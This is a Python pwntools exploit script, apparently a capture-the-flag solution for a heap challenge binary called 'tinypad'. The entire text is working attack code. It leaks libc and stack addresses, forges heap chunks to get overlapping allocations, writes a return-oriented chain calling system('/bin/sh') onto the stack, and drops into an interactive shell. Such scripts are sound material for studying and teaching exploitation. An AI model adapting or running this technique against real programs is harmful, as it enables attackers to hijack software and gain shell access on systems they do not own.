from pwn import *

p = process('./tinypad')

def menu():
	p.recvuntil('>>> ')

def add(size, msg):
	menu()
	p.sendline('A')
	menu() # SIZE
	p.sendline(str(size))
	menu() # CONTENT
	p.sendline(msg)

def edit(index, msg):
	menu()
	p.sendline('E')
	p.recvuntil('(INDEX)>>> ') # INDEX
	p.sendline(str(index))
	p.recvuntil('CONTENT: ')
	p.recvuntil('(CONTENT)>>> ') # menu() # CONTENT
	p.sendline(msg)
	menu() # Y/N
	p.sendline('Y')

def delete(index):
	menu()
	p.sendline('D')
	menu() # INDEX
	p.sendline(str(index))

table_ptr = 0x602140
free_got = 0x601F98
fake_fb = 0x602120
binsh = '/bin/sh;#'

add(0x80, 'A') # 1
add(0x80, 'B') # 2
delete(1)
p.recvuntil('CONTENT: ')
leak = u64(p.recvuntil('\n', drop=True).ljust(8, '\x00'))
libc_base = leak - 0x3c3b78
print 'libc base: %s' % hex(libc_base)
environ = libc_base + 0x3c5f98
system_addr = libc_base + 0x45380
print 'system: %s' % hex(system_addr)
binsh = libc_base + 0x18c58b
pop_rdi_ret = libc_base + 0x0013e77f
add_rsp78_ret = libc_base + 0x0013668f
print 'binsh: %s' % hex(binsh)
delete(2)

add(0x80, 'A') # 1
add(0x38, 'B') # 2
add(0xf0, 'C') # 3
add(0x100, 'D' * 0xff) # 4

delete(2)

tail = p64(0x0) + p64(0x41)
tail += p64(0x0) * 2
fake_chunk = 'A' * (0x100 - len(tail)) + tail
edit(4, fake_chunk)
delete(1)
add(0x38, '\x00' * 0x30 + p64(0xd0)) # 1
delete(3)
delete(1)

add(0x100, 'E' * 0x80 + p64(0x90) + p64(0x40) + p64(fake_fb))
add(0x38, 'A')

payload = p64(0x0101010101010101) * 2
payload += p64(0x0101010101010101) + p64(environ)
add(0x38, payload)

p.recvuntil('# CONTENT: ')
stack_addr = u64(p.recvuntil('\n', drop=True).ljust(0x8, '\x00'))
print 'stack: %s' % hex(stack_addr)
target_sp = stack_addr - 0xf0
target_sp2 = target_sp + 0x80
print 'target stack: %s' % hex(target_sp)

payload = p64(0x0101010101010101) * 2
payload += p64(0x0101010101010101) + p64(target_sp)
edit(3, payload)
edit(1, p64(add_rsp78_ret))

payload = p64(0x0101010101010101) * 2
payload += p64(0x0101010101010101) + p64(target_sp2)
edit(3, payload)
edit(1, p64(pop_rdi_ret))

payload = p64(0x0101010101010101) * 2
payload += p64(0x0101010101010101) + p64(target_sp2 + 0x8)
edit(3, payload)
edit(1, p64(binsh))

payload = p64(0x0101010101010101) * 2
payload += p64(0x0101010101010101) + p64(target_sp2 + 0x10)
edit(3, payload)
edit(1, p64(system_addr))

p.sendline('Q')

p.interactive()